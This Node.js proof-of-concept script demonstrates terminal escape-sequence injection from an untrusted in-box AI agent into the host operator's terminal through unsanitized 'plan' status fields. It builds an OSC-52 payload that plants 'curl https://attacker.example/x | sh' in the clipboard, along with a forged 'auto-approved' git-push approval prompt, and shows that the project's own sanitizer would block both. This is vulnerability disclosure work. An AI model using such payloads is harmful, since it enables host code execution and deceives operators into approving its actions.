#!/usr/bin/env node
//
// PoC: ANSI/OSC escape-sequence injection from a box into the host terminal
// ---------------------------------------------------------------------------
// The untrusted in-box agent drives the ctl socket with a claude-state update
// carrying free-text `plan`/`question`/session-title fields. socket.ts validates
// only the `state` enum and forwards plan/question verbatim; status-reporter.ts
// puts them in the BoxStatus it POSTs to the relay; the relay/host persist them
// verbatim (schema check only). Host renderers then write them to the operator's
// TTY with NO control-char stripping:
//
//   // apps/cli/src/commands/agent.ts:143  (`agentbox agent get-plan-question`)
//   process.stdout.write(claude.plan.plan + '\n');            // raw box bytes -> host TTY
//   // also: the `claude attach` alert band (footer.ts padTo) and dashboard sidebar
//
// The project ships the correct sanitizer -- sanitize() in terminal/title.ts --
// but applies it ONLY to the OSC-0 title path, never to these status fields.
//
// This PoC builds the exact box-controlled payload (an OSC-52 clipboard write +
// a cursor/erase chrome-forge), drives the REAL host sink line, and shows the
// control bytes reach the operator's stream intact -- then shows the project's
// own sanitize() would have neutralized them.
//
// Run: node poc.mjs   (no build needed)

import { PassThrough } from 'node:stream';

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

const ESC = '\x1b';
const BEL = '\x07';

// Verbatim copy of the project's sanitizer -- apps/cli/src/terminal/title.ts:7-9.
// It is applied to the OSC-title path only, never to plan/question.
function sanitize(title) {
  return title.replace(/[\x00-\x1f\x7f]/g, ' ').trim();
}

// Verbatim copy of the host sink -- apps/cli/src/commands/agent.ts:143.
function hostRenderPlan(claude, stream) {
  stream.write(claude.plan.plan + '\n');
}

async function main() {
  say('1. The untrusted box sets its "plan" to a string full of terminal escapes');
  // OSC 52: write an attacker string into the HOST clipboard. Here the "copied"
  // text is a shell command; a later operator paste into a host shell runs it.
  const clipPayload = 'curl https://attacker.example/x | sh';
  const osc52 = `${ESC}]52;c;${Buffer.from(clipPayload).toString('base64')}${BEL}`;
  // CSI: move cursor up + erase line -- overwrite/forge host-terminal chrome
  // (e.g. the AgentBox approval prompt band) for display spoofing.
  const chromeForge = `${ESC}[1A${ESC}[2K${ESC}[31mAllow git push? [Y/n] (auto-approved)${ESC}[0m`;
  const evilPlan = `benign looking plan text${osc52}${chromeForge}`;

  const claudeStatus = { plan: { plan: evilPlan, capturedAt: '2026-01-01T00:00:00Z' } };
  info('box -> ctl socket: {op:"claude-state", state:"end-plan", plan:{plan:"...ESC]52;c;<b64>BEL...ESC[1A..."}}');
  info(`OSC-52 would copy to the HOST clipboard: ${JSON.stringify(clipPayload)}`);

  say('2. Host renders it via the REAL sink: process.stdout.write(claude.plan.plan)');
  const captured = new PassThrough();
  const chunks = [];
  captured.on('data', (c) => chunks.push(c));
  hostRenderPlan(claudeStatus, captured);
  captured.end();
  await new Promise((r) => captured.on('end', r));
  const outBytes = Buffer.concat(chunks);

  const hasOsc52 = outBytes.includes(Buffer.from(`${ESC}]52;`));
  const hasCsi = outBytes.includes(Buffer.from(`${ESC}[`));
  info(`bytes written to the operator's stream: ${outBytes.length}`);
  info(`  contains raw OSC-52 clipboard-write sequence: ${hasOsc52}`);
  info(`  contains raw CSI cursor/erase (chrome forge):  ${hasCsi}`);

  say('3. The fix already in the tree (sanitize) would have neutralized it -- but is not applied here');
  const sanitized = sanitize(evilPlan);
  const safeNoOsc = !sanitized.includes(`${ESC}]52;`) && !sanitized.includes(ESC);
  info(`sanitize(plan) still contains escapes: ${!safeNoOsc}`);
  info(`sanitize(plan) = ${JSON.stringify(sanitized.slice(0, 70))}...`);

  say('4. Result');
  const ok = hasOsc52 && hasCsi && safeNoOsc;
  if (ok) {
    console.log(red('VULNERABLE') + ' -- box-controlled control bytes reach the host operator\'s terminal unmodified.');
    info('Impact: (1) OSC-52 plants an attacker command in the HOST clipboard -> host RCE on the');
    info('operator\'s next paste; (2) cursor/erase sequences forge host-terminal content, including');
    info('the AgentBox approval-prompt chrome -> social-engineer the host-action approval gate.');
    info('The same fields also render raw in `claude attach` (alert band) and the dashboard sidebar.');
  } else {
    console.log(green('NOT reproduced'));
  }
  process.exit(ok ? 0 : 1);
}
main().catch((e) => { console.error(e); process.exit(2); });
